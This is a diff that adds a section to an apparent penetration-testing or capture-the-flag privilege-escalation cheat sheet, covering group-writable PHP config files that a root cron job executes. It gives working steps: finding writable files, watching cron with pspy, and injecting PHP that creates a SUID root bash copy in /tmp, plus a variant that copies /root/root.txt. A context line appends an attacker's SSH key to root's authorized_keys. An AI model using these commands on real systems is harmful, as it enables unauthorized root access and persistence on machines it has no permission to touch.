@@ -1302,6 +1302,69 @@ echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
 
 ---
 
+### Group Writable Config File Privilege Escalation
+
+If you're in a group that can write to config files executed by root (via cron, services, etc.), you can inject code.
+
+**Detection:**
+
+```bash
+# Check your groups
+id
+# uid=1000(albert) gid=1000(albert) groups=1000(albert),1002(management)
+
+# Find files writable by your group
+find / -group management -writable 2>/dev/null
+
+# Look for config files, PHP includes, etc.
+-rwxrwxr-x 1 root management 49 Nov  5 2024 /opt/website-monitor/config/configuration.php
+```
+
+**Identify what executes the file:**
+
+```bash
+# Use pspy to monitor processes
+./pspy64
+
+# Example output showing cron job:
+# CMD: UID=0 PID=37516 | /usr/bin/php -f /opt/website-monitor/monitor.php
+```
+
+**Exploitation - PHP Config Include:**
+
+```bash
+# Original config
+cat /opt/website-monitor/config/configuration.php
+<?php
+define('PATH', '/opt/website-monitor');
+?>
+
+# Inject reverse shell or command execution
+cat << 'EOF' > /opt/website-monitor/config/configuration.php
+<?php
+define('PATH', '/opt/website-monitor');
+system('cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 6777 /tmp/rootbash;');
+?>
+EOF
+
+# Wait for cron to execute, then:
+/tmp/rootbash -p
+```
+
+**Alternative - Read sensitive files:**
+
+```php
+<?php
+define('PATH', '/opt/website-monitor');
+$file_contents = file_get_contents('/root/root.txt');
+file_put_contents('/tmp/root.txt', $file_contents);
+?>
+```
+
+**Note:** The file may be reset by automation - act quickly or set up persistence first.
+
+---
+
 ### Sudo adduser Privilege Escalation (Ubuntu Admin Group)
 
 On Ubuntu systems with default sudoers configuration, the `admin` group has full sudo privileges. If you can create a new user, create one named `admin` to exploit this.
